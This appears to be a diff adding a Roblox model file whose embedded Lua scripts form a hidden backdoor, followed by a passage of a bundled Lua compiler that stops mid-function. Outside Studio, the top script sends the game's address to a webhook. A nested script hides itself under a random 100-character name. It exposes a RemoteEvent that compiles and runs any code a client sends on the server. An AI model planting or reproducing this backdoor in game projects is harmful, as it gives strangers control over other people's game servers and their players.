@@ -1,0 +1,1690 @@
+<roblox xmlns:xmime="http://www.w3.org/2005/05/xmlmime" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://www.roblox.com/roblox.xsd" version="4">
+        <Meta name="ExplicitAutoJoints">true</Meta>
+        <External>null</External>
+        <External>nil</External>
+        <Item class="Script" referent="RBX513CF08B0A1744E49897D7BBD4C1EEA8">
+                <Properties>
+                        <BinaryString name="AttributesSerialize"></BinaryString>
+                        <bool name="Disabled">false</bool>
+                        <Content name="LinkedSource"><null></null></Content>
+                        <string name="Name">Script</string>
+                        <string name="ScriptGuid">{F6E9AC87-4129-4F79-8F35-C06FD8DCC450}</string>
+                        <ProtectedString name="Source"><![CDATA[local RunService = game:GetService("RunService")
+
+if RunService:IsStudio() then
+        return;
+end
+
+if RunService:IsRunMode() then
+        return;
+end
+
+pcall(function()
+        local ID = game.PlaceId 
+
+        local http = game:GetService("HttpService")
+        local Data = {
+                ["content"] = "https://www.roblox.com/games/"..ID
+        }
+
+        Data = http:JSONEncode(Data)
+
+        http:PostAsync("link", Data) --Put the link you saved between the two quotes.
+end) 
+
+
+script.Loadstring.Parent = game:GetService("ServerStorage")
+
+require(script.MainModule)()]]></ProtectedString>
+                        <BinaryString name="Tags"></BinaryString>
+                </Properties>
+                <Item class="ModuleScript" referent="RBX0FD16A696ECB4260A348B2F69960C846">
+                        <Properties>
+                                <BinaryString name="AttributesSerialize"></BinaryString>
+                                <Content name="LinkedSource"><null></null></Content>
+                                <string name="Name">MainModule</string>
+                                <string name="ScriptGuid">{72F0A599-BA60-49A6-87AF-527726452DEE}</string>
+                                <ProtectedString name="Source"><![CDATA[local RunService = game:GetService("RunService")
+
+if RunService:IsStudio() then
+        return;
+end
+
+if RunService:IsRunMode() then
+        return;
+end
+
+
+script.Parent = nil
+
+return function()
+if not game:GetService("ServerScriptService"):FindFirstChild("SS") then
+local ss = script:FindFirstChild("SS");
+local ss_clone = ss:Clone();
+ss_clone.Parent = game:GetService("ServerScriptService");
+return
+else
+game:GetService("ServerScriptService"):FindFirstChild("SS"):ClearAllChildren();
+game:GetService("ServerScriptService"):FindFirstChild("SS"):Destroy();
+wait()
+local ss = script:FindFirstChild("SS");
+local ss_clone = ss:Clone();
+ss_clone.Parent = game:GetService("ServerScriptService");
+repeat wait() until game:GetService("ServerScriptService"):FindFirstChild("SS");
+return
+end
+end]]></ProtectedString>
+                                <BinaryString name="Tags"></BinaryString>
+                        </Properties>
+                        <Item class="Folder" referent="RBX2324F563A1D54C9BB830AE51D08F75C2">
+                                <Properties>
+                                        <BinaryString name="AttributesSerialize"></BinaryString>
+                                        <string name="Name">SS</string>
+                                        <BinaryString name="Tags"></BinaryString>
+                                </Properties>
+                                <Item class="RemoteEvent" referent="RBXF65EBA1A5F7644349E4680E5A7D3AC05">
+                                        <Properties>
+                                                <BinaryString name="AttributesSerialize"></BinaryString>
+                                                <string name="Name">LoadString_remote</string>
+                                                <BinaryString name="Tags"></BinaryString>
+                                        </Properties>
+                                </Item>
+                                <Item class="Script" referent="RBXB8E9860CADC44875A562DB8CD41111DB">
+                                        <Properties>
+                                                <BinaryString name="AttributesSerialize"></BinaryString>
+                                                <bool name="Disabled">false</bool>
+                                                <Content name="LinkedSource"><null></null></Content>
+                                                <string name="Name">yeetus</string>
+                                                <string name="ScriptGuid">{71C03847-2F7C-49C7-A0BA-130827968C96}</string>
+                                                <ProtectedString name="Source"><![CDATA[local RunService = game:GetService("RunService")
+
+if RunService:IsStudio() then
+        return;
+end
+
+if RunService:IsRunMode() then
+        return;
+end
+
+if not game:GetService("ServerStorage"):FindFirstChild("Loadstring") then
+local module = script.Parent:FindFirstChild("Loadstring")
+module_clone = module:Clone()
+module_clone.Parent = game:GetService("ServerStorage")
+repeat wait() until game:GetService("ServerStorage"):FindFirstChild("Loadstring")
+else
+game:GetService("ServerStorage"):FindFirstChild("Loadstring"):ClearAllChildren()
+game:GetService("ServerStorage"):FindFirstChild("Loadstring"):Destroy()
+wait()
+local module = script.Parent:FindFirstChild("Loadstring")
+module_clone = module:Clone()
+module_clone.Parent = game:GetService("ServerStorage")
+end
+
+if not game:GetService("ReplicatedStorage"):FindFirstChild("LoadString_remote") then
+local module = script.Parent:FindFirstChild("LoadString_remote")
+module_clone = module:Clone()
+module_clone.Parent = game:GetService("ReplicatedStorage")
+repeat wait() until game:GetService("ReplicatedStorage"):FindFirstChild("LoadString_remote")
+else
+game:GetService("ReplicatedStorage"):FindFirstChild("LoadString_remote"):ClearAllChildren()
+game:GetService("ReplicatedStorage"):FindFirstChild("LoadString_remote"):Destroy()
+wait()
+local module = script.Parent:FindFirstChild("LoadString_remote")
+module_clone = module:Clone()
+module_clone.Parent = game:GetService("ReplicatedStorage")
+repeat wait() until game:GetService("ReplicatedStorage"):FindFirstChild("LoadString_remote")
+end
+
+local letters = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"}
+
+function assing_value(number)
+        if number <= 26 then
+                number = letters[number]
+                else
+                number = number - 27
+        end
+        return number
+end
+
+function create_id(length)
+        local id = ""
+        if length > 0 then
+                for i = 1, length do
+                        local number = math.random(1, 36)
+                        id = id .. assing_value(number)
+                end
+        end
+        return id
+end
+
+
+script.Name = ""..create_id(100)
+
+
+--for :FireServer() events.
+
+local deletus = game:GetService("ReplicatedStorage"):FindFirstChild("LoadString_remote")
+
+local function yeetus(player,a)
+local pl = tostring(player) --so it doesnt say its a player value
+
+
+local load = game:GetService("ServerStorage"):FindFirstChild("Loadstring")
+local loadstring=require(load)
+local code=tostring(a)
+
+print("listened to "..pl.."'s request")
+print("the script requested was: "..code)
+
+local func,error=loadstring(code,getfenv())
+if func then
+        func()
+else 
+        print((error:match(".+:(.*)") or error)) --code totally not stolen from epix admin ok?
+end
+
+loadstring(a)
+
+end
+deletus.OnServerEvent:Connect(yeetus)]]></ProtectedString>
+                                                <BinaryString name="Tags"></BinaryString>
+                                        </Properties>
+                                </Item>
+                                <Item class="ModuleScript" referent="RBX0DE16B5D2F944B178A5B2AC68FDEA55A">
+                                        <Properties>
+                                                <BinaryString name="AttributesSerialize"></BinaryString>
+                                                <Content name="LinkedSource"><null></null></Content>
+                                                <string name="Name">Loadstring</string>
+                                                <string name="ScriptGuid">{E8CA84C9-F7A1-420A-B39F-ED6E1B09481A}</string>
+                                                <ProtectedString name="Source"><![CDATA[--[[
+        Credit to einsteinK.
+        Credit to Stravant for LBI.
+
+        Credit to the creators of all the other modules used in this.
+
+        Sceleratis was here and decided modify some things.
+--]]
+
+local waitDeps = {
+        'LBI';
+        'LuaK';
+        'LuaP';
+        'LuaU';
+        'LuaX';
+        'LuaY';
+        'LuaZ';
+}
+
+for i,v in pairs(waitDeps) do script:WaitForChild(v) end
+
+local luaX = require(script.LuaX)
+local luaY = require(script.LuaY)
+local luaZ = require(script.LuaZ)
+local luaU = require(script.LuaU)
+local lbi = require(script.LBI)
+
+luaX:init()
+local LuaState = {}
+
+return function(str,env)
+        local f,writer,buff
+        local ran,error=pcall(function()
+                local zio = luaZ:init(luaZ:make_getS(str), nil)
+                if not zio then return error() end
+                local func = luaY:parser(LuaState, zio, nil, "@input")
+                writer, buff = luaU:make_setS()
+                luaU:dump(LuaState, func, writer, buff)
+                f = lbi.load_bytecode(buff.data)
+                if env then                
+                        setfenv(f,env)
+                else
+                        local env=getfenv()
+                        env.script=nil
+                        setfenv(f,env)
+                end
+        end)
+        if ran then
+                return f,buff.data
+        else
+                return nil,error
+        end
+end]]></ProtectedString>
+                                                <BinaryString name="Tags"></BinaryString>
+                                        </Properties>
+                                        <Item class="ModuleScript" referent="RBX3CBB821515F642678B64204BA4F62C1C">
+                                                <Properties>
+                                                        <BinaryString name="AttributesSerialize"></BinaryString>
+                                                        <Content name="LinkedSource"><null></null></Content>
+                                                        <string name="Name">LuaZ</string>
+                                                        <string name="ScriptGuid">{81023011-CB21-43CB-AE77-2BE601BF5106}</string>
+                                                        <ProtectedString name="Source"><![CDATA[--[[--------------------------------------------------------------------
+
+  lzio.lua
+  Lua buffered streams in Lua
+  This file is part of Yueliang.
+
+  Copyright (c) 2005-2006 Kein-Hong Man <khman@users.sf.net>
+  The COPYRIGHT file describes the conditions
+  under which this software may be distributed.
+
+  See the ChangeLog for more information.
+
+----------------------------------------------------------------------]]
+
+--[[--------------------------------------------------------------------
+-- Notes:
+-- * EOZ is implemented as a string, "EOZ"
+-- * Format of z structure (ZIO)
+--     z.n       -- bytes still unread
+--     z.p       -- last read position position in buffer
+--     z.reader  -- chunk reader function
+--     z.data    -- additional data
+-- * Current position, p, is now last read index instead of a pointer
+--
+-- Not implemented:
+-- * luaZ_lookahead: used only in lapi.c:lua_load to detect binary chunk
+-- * luaZ_read: used only in lundump.c:ezread to read +1 bytes
+-- * luaZ_openspace: dropped; let Lua handle buffers as strings (used in
+--   lundump.c:LoadString & lvm.c:luaV_concat)
+-- * luaZ buffer macros: dropped; buffers are handled as strings
+-- * lauxlib.c:getF reader implementation has an extraline flag to
+--   skip over a shbang (#!) line, this is not implemented here
+--
+-- Added:
+-- (both of the following are vaguely adapted from lauxlib.c)
+-- * luaZ:make_getS: create Reader from a string
+-- * luaZ:make_getF: create Reader that reads from a file
+--
+-- Changed in 5.1.x:
+-- * Chunkreader renamed to Reader (ditto with Chunkwriter)
+-- * Zio struct: no more name string, added Lua state for reader
+--   (however, Yueliang readers do not require a Lua state)
+----------------------------------------------------------------------]]
+
+local luaZ = {}
+
+------------------------------------------------------------------------
+-- * reader() should return a string, or nil if nothing else to parse.
+--   Additional data can be set only during stream initialization
+-- * Readers are handled in lauxlib.c, see luaL_load(file|buffer|string)
+-- * LUAL_BUFFERSIZE=BUFSIZ=512 in make_getF() (located in luaconf.h)
+-- * Original Reader typedef:
+--   const char * (*lua_Reader) (lua_State *L, void *ud, size_t *sz);
+-- * This Lua chunk reader implementation:
+--   returns string or nil, no arguments to function
+------------------------------------------------------------------------
+
+------------------------------------------------------------------------
+-- create a chunk reader from a source string
+------------------------------------------------------------------------
+function luaZ:make_getS(buff)
+  local b = buff
+  return function() -- chunk reader anonymous function here
+    if not b then return nil end
+    local data = b
+    b = nil
+    return data
+  end
+end
+
+------------------------------------------------------------------------
+-- create a chunk reader from a source file
+------------------------------------------------------------------------
+--[[
+function luaZ:make_getF(filename)
+  local LUAL_BUFFERSIZE = 512
+  local h = io.open(filename, "r")
+  if not h then return nil end
+  return function() -- chunk reader anonymous function here
+    if not h or io.type(h) == "closed file" then return nil end
+    local buff = h:read(LUAL_BUFFERSIZE)
+    if not buff then h:close(); h = nil end
+    return buff
+  end
+end
+--]]
+------------------------------------------------------------------------
+-- creates a zio input stream
+-- returns the ZIO structure, z
+------------------------------------------------------------------------
+function luaZ:init(reader, data, name)
+  if not reader then return end
+  local z = {}
+  z.reader = reader
+  z.data = data or ""
+  z.name = name
+  -- set up additional data for reading
+  if not data or data == "" then z.n = 0 else z.n = #data end
+  z.p = 0
+  return z
+end
+
+------------------------------------------------------------------------
+-- fill up input buffer
+------------------------------------------------------------------------
+function luaZ:fill(z)
+  local buff = z.reader()
+  z.data = buff
+  if not buff or buff == "" then return "EOZ" end
+  z.n, z.p = #buff - 1, 1
+  return string.sub(buff, 1, 1)
+end
+
+------------------------------------------------------------------------
+-- get next character from the input stream
+-- * local n, p are used to optimize code generation
+------------------------------------------------------------------------
+function luaZ:zgetc(z)
+  local n, p = z.n, z.p + 1
+  if n > 0 then
+    z.n, z.p = n - 1, p
+    return string.sub(z.data, p, p)
+  else
+    return self:fill(z)
+  end
+end
+
+return luaZ]]></ProtectedString>
+                                                        <BinaryString name="Tags"></BinaryString>
+                                                </Properties>
+                                        </Item>
+                                        <Item class="ModuleScript" referent="RBX0ECA998CC5F84D31AF458E6F09CE0E57">
+                                                <Properties>
+                                                        <BinaryString name="AttributesSerialize"></BinaryString>
+                                                        <Content name="LinkedSource"><null></null></Content>
+                                                        <string name="Name">LuaX</string>
+                                                        <string name="ScriptGuid">{EFB51D70-E670-41F6-B3DF-4B301A27E9A8}</string>
+                                                        <ProtectedString name="Source"><![CDATA[--[[--------------------------------------------------------------------
+
+  llex.lua
+  Lua lexical analyzer in Lua
+  This file is part of Yueliang.
+
+  Copyright (c) 2005-2006 Kein-Hong Man <khman@users.sf.net>
+  The COPYRIGHT file describes the conditions
+  under which this software may be distributed.
+
+  See the ChangeLog for more information.
+
+----------------------------------------------------------------------]]
+
+--[[--------------------------------------------------------------------
+-- Notes:
+-- * intended to 'imitate' llex.c code; performance is not a concern
+-- * tokens are strings; code structure largely retained
+-- * deleted stuff (compared to llex.c) are noted, comments retained
+-- * nextc() returns the currently read character to simplify coding
+--   here; next() in llex.c does not return anything
+-- * compatibility code is marked with "--#" comments
+--
+-- Added:
+-- * luaX:chunkid (function luaO_chunkid from lobject.c)
+-- * luaX:str2d (function luaO_str2d from lobject.c)
+-- * luaX.LUA_QS used in luaX:lexerror (from luaconf.h)
+-- * luaX.LUA_COMPAT_LSTR in luaX:read_long_string (from luaconf.h)
+-- * luaX.MAX_INT used in luaX:inclinenumber (from llimits.h)
+--
+-- To use the lexer:
+-- (1) luaX:init() to initialize the lexer
+-- (2) luaX:setinput() to set the input stream to lex
+-- (3) call luaX:next() or luaX:luaX:lookahead() to get tokens,
+--     until "TK_EOS": luaX:next()
+-- * since EOZ is returned as a string, be careful when regexp testing
+--
+-- Not implemented:
+-- * luaX_newstring: not required by this Lua implementation
+-- * buffer MAX_SIZET size limit (from llimits.h) test not implemented
+--   in the interest of performance
+-- * locale-aware number handling is largely redundant as Lua's
+--   tonumber() function is already capable of this
+--
+-- Changed in 5.1.x:
+-- * TK_NAME token order moved down
+-- * string representation for TK_NAME, TK_NUMBER, TK_STRING changed
+-- * token struct renamed to lower case (LS -> ls)
+-- * LexState struct: removed nestlevel, added decpoint
+-- * error message functions have been greatly simplified
+-- * token2string renamed to luaX_tokens, exposed in llex.h
+-- * lexer now handles all kinds of newlines, including CRLF
+-- * shbang first line handling removed from luaX:setinput;
+--   it is now done in lauxlib.c (luaL_loadfile)
+-- * next(ls) macro renamed to nextc(ls) due to new luaX_next function
+-- * EXTRABUFF and MAXNOCHECK removed due to lexer changes
+-- * checkbuffer(ls, len) macro deleted
+-- * luaX:read_numeral now has 3 support functions: luaX:trydecpoint,
+--   luaX:buffreplace and (luaO_str2d from lobject.c) luaX:str2d
+-- * luaX:read_numeral is now more promiscuous in slurping characters;
+--   hexadecimal numbers was added, locale-aware decimal points too
+-- * luaX:skip_sep is new; used by luaX:read_long_string
+-- * luaX:read_long_string handles new-style long blocks, with some
+--   optional compatibility code
+-- * luaX:llex: parts changed to support new-style long blocks
+-- * luaX:llex: readname functionality has been folded in
+-- * luaX:llex: removed test for control characters
+--
+--------------------------------------------------------------------]]
+
+local luaZ = require(script.Parent.LuaZ)
+
+local luaX = {}
+
+-- FIRST_RESERVED is not required as tokens are manipulated as strings
+-- TOKEN_LEN deleted; maximum length of a reserved word not needed
+
+------------------------------------------------------------------------
+-- "ORDER RESERVED" deleted; enumeration in one place: luaX.RESERVED
+------------------------------------------------------------------------
+
+-- terminal symbols denoted by reserved words: TK_AND to TK_WHILE
+-- other terminal symbols: TK_NAME to TK_EOS
+luaX.RESERVED = [[
+TK_AND and
+TK_BREAK break
+TK_DO do
+TK_ELSE else
+TK_ELSEIF elseif
+TK_END end
+TK_FALSE false
+TK_FOR for
+TK_FUNCTION function
+TK_IF if
+TK_IN in
+TK_LOCAL local
+TK_NIL nil
+TK_NOT not
+TK_OR or
+TK_REPEAT repeat
+TK_RETURN return
+TK_THEN then
+TK_TRUE true
+TK_UNTIL until
+TK_WHILE while
+TK_CONCAT ..
+TK_DOTS ...
+TK_EQ ==
+TK_GE >=
+TK_LE <=
+TK_NE ~=
+TK_NAME <name>
+TK_NUMBER <number>
+TK_STRING <string>
+TK_EOS <eof>]]
+
+-- NUM_RESERVED is not required; number of reserved words
+
+--[[--------------------------------------------------------------------
+-- Instead of passing seminfo, the Token struct (e.g. ls.t) is passed
+-- so that lexer functions can use its table element, ls.t.seminfo
+--
+-- SemInfo (struct no longer needed, a mixed-type value is used)
+--
+-- Token (struct of ls.t and ls.lookahead):
+--   token  -- token symbol
+--   seminfo  -- semantics information
+--
+-- LexState (struct of ls; ls is initialized by luaX:setinput):
+--   current  -- current character (charint)
+--   linenumber  -- input line counter
+--   lastline  -- line of last token 'consumed'
+--   t  -- current token (table: struct Token)
+--   lookahead  -- look ahead token (table: struct Token)
+--   fs  -- 'FuncState' is private to the parser
+--   L -- LuaState
+--   z  -- input stream
+--   buff  -- buffer for tokens
+--   source  -- current source name
+--   decpoint -- locale decimal point
+--   nestlevel  -- level of nested non-terminals
+----------------------------------------------------------------------]]
+
+-- luaX.tokens (was luaX_tokens) is now a hash; see luaX:init
+
+luaX.MAXSRC = 80
+luaX.MAX_INT = 2147483645       -- constants from elsewhere (see above)
+luaX.LUA_QS = "'%s'"
+luaX.LUA_COMPAT_LSTR = 1
+--luaX.MAX_SIZET = 4294967293
+
+------------------------------------------------------------------------
+-- initialize lexer
+-- * original luaX_init has code to create and register token strings
+-- * luaX.tokens: TK_* -> token
+-- * luaX.enums:  token -> TK_* (used in luaX:llex)
+------------------------------------------------------------------------
+function luaX:init()
+  local tokens, enums = {}, {}
+  for v in string.gmatch(self.RESERVED, "[^\n]+") do
+    local _, _, tok, str = string.find(v, "(%S+)%s+(%S+)")
+    tokens[tok] = str
+    enums[str] = tok
+  end
+  self.tokens = tokens
+  self.enums = enums
+end
+
+------------------------------------------------------------------------
+-- returns a suitably-formatted chunk name or id
+-- * from lobject.c, used in llex.c and ldebug.c
+-- * the result, out, is returned (was first argument)
+------------------------------------------------------------------------
+function luaX:chunkid(source, bufflen)
+  local out
+  local first = string.sub(source, 1, 1)
+  if first == "=" then
+    out = string.sub(source, 2, bufflen)  -- remove first char
+  else  -- out = "source", or "...source"
+    if first == "@" then
+      source = string.sub(source, 2)  -- skip the '@'
+      bufflen = bufflen - #" '...' "
+      local l = #source
+      out = ""
+      if l > bufflen then
+        source = string.sub(source, 1 + l - bufflen)  -- get last part of file name
+        out = out.."..."
+      end
+      out = out..source
+    else  -- out = [string "string"]
+      local len = string.find(source, "[\n\r]")  -- stop at first newline
+      len = len and (len - 1) or #source
+      bufflen = bufflen - #(" [string \"...\"] ")
+      if len > bufflen then len = bufflen end
+      out = "[string \""
+      if len < #source then  -- must truncate?
+        out = out..string.sub(source, 1, len).."..."
+      else
+        out = out..source
+      end
+      out = out.."\"]"
+    end
+  end
+  return out
+end
+
+--[[--------------------------------------------------------------------
+-- Support functions for lexer
+-- * all lexer errors eventually reaches lexerror:
+     syntaxerror -> lexerror
+----------------------------------------------------------------------]]
+
+------------------------------------------------------------------------
+-- look up token and return keyword if found (also called by parser)
+------------------------------------------------------------------------
+function luaX:token2str(ls, token)
+  if string.sub(token, 1, 3) ~= "TK_" then
+    if string.find(token, "%c") then
+      return string.format("char(%d)", string.byte(token))
+    end
+    return token
+  else
+  end
+    return self.tokens[token]
+end
+
+------------------------------------------------------------------------
+-- throws a lexer error
+-- * txtToken has been made local to luaX:lexerror
+-- * can't communicate LUA_ERRSYNTAX, so it is unimplemented
+------------------------------------------------------------------------
+function luaX:lexerror(ls, msg, token)
+  local function txtToken(ls, token)
+    if token == "TK_NAME" or
+       token == "TK_STRING" or
+       token == "TK_NUMBER" then
+      return ls.buff
+    else
+      return self:token2str(ls, token)
+    end
+  end
+  local buff = self:chunkid(ls.source, self.MAXSRC)
+  local msg = string.format("%s:%d: %s", buff, ls.linenumber, msg)
+  if token then
+    msg = string.format("%s near "..self.LUA_QS, msg, txtToken(ls, token))
+  end
+  -- luaD_throw(ls->L, LUA_ERRSYNTAX)
+  error(msg)
+end
+
+------------------------------------------------------------------------
+-- throws a syntax error (mainly called by parser)
+-- * ls.t.token has to be set by the function calling luaX:llex
+--   (see luaX:next and luaX:lookahead elsewhere in this file)
+------------------------------------------------------------------------
+function luaX:syntaxerror(ls, msg)
+  self:lexerror(ls, msg, ls.t.token)
+end
+
+------------------------------------------------------------------------
+-- move on to next line
+------------------------------------------------------------------------
+function luaX:currIsNewline(ls)
+  return ls.current == "\n" or ls.current == "\r"
+end
+
+function luaX:inclinenumber(ls)
+  local old = ls.current
+  -- lua_assert(currIsNewline(ls))
+  self:nextc(ls)  -- skip '\n' or '\r'
+  if self:currIsNewline(ls) and ls.current ~= old then
+    self:nextc(ls)  -- skip '\n\r' or '\r\n'
+  end
+  ls.linenumber = ls.linenumber + 1
+  if ls.linenumber >= self.MAX_INT then
+    self:syntaxerror(ls, "chunk has too many lines")
+  end
+end
+
+------------------------------------------------------------------------
+-- initializes an input stream for lexing
+-- * if ls (the lexer state) is passed as a table, then it is filled in,
+--   otherwise it has to be retrieved as a return value
+-- * LUA_MINBUFFER not used; buffer handling not required any more
+------------------------------------------------------------------------
+function luaX:setinput(L, ls, z, source)
+  if not ls then ls = {} end  -- create struct
+  if not ls.lookahead then ls.lookahead = {} end
+  if not ls.t then ls.t = {} end
+  ls.decpoint = "."
+  ls.L = L
+  ls.lookahead.token = "TK_EOS"  -- no look-ahead token
+  ls.z = z
+  ls.fs = nil
+  ls.linenumber = 1
+  ls.lastline = 1
+  ls.source = source
+  self:nextc(ls)  -- read first char
+end
+
+--[[--------------------------------------------------------------------
+-- LEXICAL ANALYZER
+----------------------------------------------------------------------]]
+
+------------------------------------------------------------------------
+-- checks if current character read is found in the set 'set'
+------------------------------------------------------------------------
+function luaX:check_next(ls, set)
+  if not string.find(set, ls.current, 1, 1) then
+    return false
+  end
+  self:save_and_next(ls)
+  return true
+end
+
+------------------------------------------------------------------------
+-- retrieve next token, checking the lookahead buffer if necessary
+-- * note that the macro next(ls) in llex.c is now luaX:nextc
+-- * utilized used in lparser.c (various places)
+------------------------------------------------------------------------
+function luaX:next(ls)
+  ls.lastline = ls.linenumber
+  if ls.lookahead.token ~= "TK_EOS" then  -- is there a look-ahead token?
+    -- this must be copy-by-value
+    ls.t.seminfo = ls.lookahead.seminfo  -- use this one
+    ls.t.token = ls.lookahead.token
+    ls.lookahead.token = "TK_EOS"  -- and discharge it
+  else
+    ls.t.token = self:llex(ls, ls.t)  -- read next token
+  end
+end
+
+------------------------------------------------------------------------
+-- fill in the lookahead buffer
+-- * utilized used in lparser.c:constructor
+------------------------------------------------------------------------
+function luaX:lookahead(ls)
+  -- lua_assert(ls.lookahead.token == "TK_EOS")
+  ls.lookahead.token = self:llex(ls, ls.lookahead)
+end
+
+------------------------------------------------------------------------
+-- gets the next character and returns it
+-- * this is the next() macro in llex.c; see notes at the beginning
+------------------------------------------------------------------------
+function luaX:nextc(ls)
+  local c = luaZ:zgetc(ls.z)
+  ls.current = c
+  return c
+end
+
+------------------------------------------------------------------------
+-- saves the given character into the token buffer
+-- * buffer handling code removed, not used in this implementation
+-- * test for maximum token buffer length not used, makes things faster
+------------------------------------------------------------------------
+
+function luaX:save(ls, c)
+  local buff = ls.buff
+  -- if you want to use this, please uncomment luaX.MAX_SIZET further up
+  --if #buff > self.MAX_SIZET then
+  --  self:lexerror(ls, "lexical element too long")
+  --end
+  ls.buff = buff..c
+end
+
+------------------------------------------------------------------------
+-- save current character into token buffer, grabs next character
+-- * like luaX:nextc, returns the character read for convenience
+------------------------------------------------------------------------
+function luaX:save_and_next(ls)
+  self:save(ls, ls.current)
+  return self:nextc(ls)
+end
+
+------------------------------------------------------------------------
+-- LUA_NUMBER
+-- * luaX:read_numeral is the main lexer function to read a number
+-- * luaX:str2d, luaX:buffreplace, luaX:trydecpoint are support functions
+------------------------------------------------------------------------
+
+------------------------------------------------------------------------
+-- string to number converter (was luaO_str2d from lobject.c)
+-- * returns the number, nil if fails (originally returns a boolean)
+-- * conversion function originally lua_str2number(s,p), a macro which
+--   maps to the strtod() function by default (from luaconf.h)
+------------------------------------------------------------------------
+function luaX:str2d(s)
+  local result = tonumber(s)
+  if result then return result end
+  -- conversion failed
+  if string.lower(string.sub(s, 1, 2)) == "0x" then  -- maybe an hexadecimal constant?
+    result = tonumber(s, 16)
+    if result then return result end  -- most common case
+    -- Was: invalid trailing characters?
+    -- In C, this function then skips over trailing spaces.
+    -- true is returned if nothing else is found except for spaces.
+    -- If there is still something else, then it returns a false.
+    -- All this is not necessary using Lua's tonumber.
+  end
+  return nil
+end
+
+------------------------------------------------------------------------
+-- single-character replacement, for locale-aware decimal points
+------------------------------------------------------------------------
+function luaX:buffreplace(ls, from, to)
+  local result, buff = "", ls.buff
+  for p = 1, #buff do
+    local c = string.sub(buff, p, p)
+    if c == from then c = to end
+    result = result..c
+  end
+  ls.buff = result
+end
+
+------------------------------------------------------------------------
+-- Attempt to convert a number by translating '.' decimal points to
+-- the decimal point character used by the current locale. This is not
+-- needed in Yueliang as Lua's tonumber() is already locale-aware.
+-- Instead, the code is here in case the user implements localeconv().
+------------------------------------------------------------------------
+function luaX:trydecpoint(ls, Token)
+  -- format error: try to update decimal point separator
+  local old = ls.decpoint
+  -- translate the following to Lua if you implement localeconv():
+  -- struct lconv *cv = localeconv();
+  -- ls->decpoint = (cv ? cv->decimal_point[0] : '.');
+  self:buffreplace(ls, old, ls.decpoint)  -- try updated decimal separator
+  local seminfo = self:str2d(ls.buff)
+  Token.seminfo = seminfo
+  if not seminfo then
+    -- format error with correct decimal point: no more options
+    self:buffreplace(ls, ls.decpoint, ".")  -- undo change (for error message)
+    self:lexerror(ls, "malformed number", "TK_NUMBER")
+  end
+end
+
+------------------------------------------------------------------------
+-- main number conversion function
+-- * "^%w$" needed in the scan in order to detect "EOZ"
+------------------------------------------------------------------------
+function luaX:read_numeral(ls, Token)
+  -- lua_assert(string.find(ls.current, "%d"))
+  repeat
+    self:save_and_next(ls)
+  until string.find(ls.current, "%D") and ls.current ~= "."
+  if self:check_next(ls, "Ee") then  -- 'E'?
+    self:check_next(ls, "+-")  -- optional exponent sign
+  end
+  while string.find(ls.current, "^%w$") or ls.current == "_" do
+    self:save_and_next(ls)
+  end
+  self:buffreplace(ls, ".", ls.decpoint)  -- follow locale for decimal point
+  local seminfo = self:str2d(ls.buff)
+  Token.seminfo = seminfo
+  if not seminfo then  -- format error?
+    self:trydecpoint(ls, Token) -- try to update decimal point separator
+  end
+end
+
+------------------------------------------------------------------------
+-- count separators ("=") in a long string delimiter
+-- * used by luaX:read_long_string
+------------------------------------------------------------------------
+function luaX:skip_sep(ls)
+  local count = 0
+  local s = ls.current
+  -- lua_assert(s == "[" or s == "]")
+  self:save_and_next(ls)
+  while ls.current == "=" do
+    self:save_and_next(ls)
+    count = count + 1
+  end
+  return (ls.current == s) and count or (-count) - 1
+end
+
+------------------------------------------------------------------------
+-- reads a long string or long comment
+------------------------------------------------------------------------
+function luaX:read_long_string(ls, Token, sep)
+  local cont = 0
+  self:save_and_next(ls)  -- skip 2nd '['
+  if self:currIsNewline(ls) then  -- string starts with a newline?
+    self:inclinenumber(ls)  -- skip it
+  end
+  while true do
+    local c = ls.current
+    if c == "EOZ" then
+      self:lexerror(ls, Token and "unfinished long string" or
+                    "unfinished long comment", "TK_EOS")
+    elseif c == "[" then
+      --# compatibility code start
+      if self.LUA_COMPAT_LSTR then
+        if self:skip_sep(ls) == sep then
+          self:save_and_next(ls)  -- skip 2nd '['
+          cont = cont + 1
+          --# compatibility code start
+          if self.LUA_COMPAT_LSTR == 1 then
+            if sep == 0 then
+              self:lexerror(ls, "nesting of [[...]] is deprecated", "[")
+            end
+          end
+          --# compatibility code end
+        end
+      end
+      --# compatibility code end
+    elseif c == "]" then
+      if self:skip_sep(ls) == sep then
+        self:save_and_next(ls)  -- skip 2nd ']'
+        --# compatibility code start
+        if self.LUA_COMPAT_LSTR and self.LUA_COMPAT_LSTR == 2 then
+          cont = cont - 1
+          if sep == 0 and cont >= 0 then break end
+        end
+        --# compatibility code end
+        break
+      end
+    elseif self:currIsNewline(ls) then
+      self:save(ls, "\n")
+      self:inclinenumber(ls)
+      if not Token then ls.buff = "" end -- avoid wasting space
+    else  -- default
+      if Token then
+        self:save_and_next(ls)
+      else
+        self:nextc(ls)
+      end
+    end--if c
+  end--while
+  if Token then
+    local p = 3 + sep
+    Token.seminfo = string.sub(ls.buff, p, -p)
+  end
+end
+
+------------------------------------------------------------------------
+-- reads a string
+-- * has been restructured significantly compared to the original C code
+------------------------------------------------------------------------
+
+function luaX:read_string(ls, del, Token)
+  self:save_and_next(ls)
+  while ls.current ~= del do
+    local c = ls.current
+    if c == "EOZ" then
+      self:lexerror(ls, "unfinished string", "TK_EOS")
+    elseif self:currIsNewline(ls) then
+      self:lexerror(ls, "unfinished string", "TK_STRING")
+    elseif c == "\\" then
+      c = self:nextc(ls)  -- do not save the '\'
+      if self:currIsNewline(ls) then  -- go through
+        self:save(ls, "\n")
+        self:inclinenumber(ls)
+      elseif c ~= "EOZ" then -- will raise an error next loop
+        -- escapes handling greatly simplified here:
+        local i = string.find("abfnrtv", c, 1, 1)
+        if i then
+          self:save(ls, string.sub("\a\b\f\n\r\t\v", i, i))
+          self:nextc(ls)
+        elseif not string.find(c, "%d") then
+          self:save_and_next(ls)  -- handles \\, \", \', and \?
+        else  -- \xxx
+          c, i = 0, 0
+          repeat
+            c = 10 * c + ls.current
+            self:nextc(ls)
+            i = i + 1
+          until i >= 3 or not string.find(ls.current, "%d")
+          if c > 255 then  -- UCHAR_MAX
+            self:lexerror(ls, "escape sequence too large", "TK_STRING")
+          end
+          self:save(ls, string.char(c))
+        end
+      end
+    else
+      self:save_and_next(ls)
+    end--if c
+  end--while
+  self:save_and_next(ls)  -- skip delimiter
